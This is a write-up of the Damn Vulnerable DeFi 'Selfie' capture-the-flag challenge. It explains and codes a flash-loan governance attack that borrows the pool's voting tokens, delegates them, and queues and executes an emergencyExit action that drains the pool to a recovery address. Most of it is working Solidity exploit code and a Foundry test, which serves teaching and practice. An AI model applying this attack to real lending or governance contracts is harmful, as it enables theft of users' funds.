# Selfie CTF Writeup

## Challenge Description
A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

## The Exploit Strategy
There are two contracts SimpleGovernance and SelfiePool. SelfiePool consits some functions and it provides flasloan and emergency exit to transfer amount in critical emergency and SimpleGovernance provides governing techniques to do things with execution
.'emergencyExit' function has modifier to checck whether owner is governcace or not.

1. get the flashloan
2. make the token delegatation to pass governace check
3. while repaying the flashLoan create exploitable action to trigger the emergencyExit function with param recovery address.
4. after the flash loan call the execute action after two days 



## Solution

```solidity
function test_selfie() public checkSolvedByPlayer {
        Attack attack = new Attack(address(pool), address(token), address(governance),recovery);
        attack.attack();
        vm.warp(block.timestamp + 2 days);
        require(attack.executeAction());
}
```

```solidity
contract Attack is IERC3156FlashBorrower {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;
    uint256 actionId;

    constructor(address _pool, address _token, address _governance, address _recovery) {
        token = DamnValuableVotes(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        recovery = _recovery;
    }

    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata _data)
        external
        override
        returns (bytes32)
    {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        token.delegate(address(this));

        actionId = governance.queueAction(address(pool), 0, data);
        IERC20(token).approve(address(pool),amount+fee);
        bytes32 CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
        return CALLBACK_SUCCESS;
    }

    function attack() external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), 1_500_000e18, "");
    }

    function executeAction() external returns(bool){
        bytes memory data = governance.executeAction(actionId);
        return true;
    }
}
```

## References
- [Solution Link](https://docs.soliditylang.org/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)

 forge test --mp test/selfie/Selfie.t.sol -vvvv




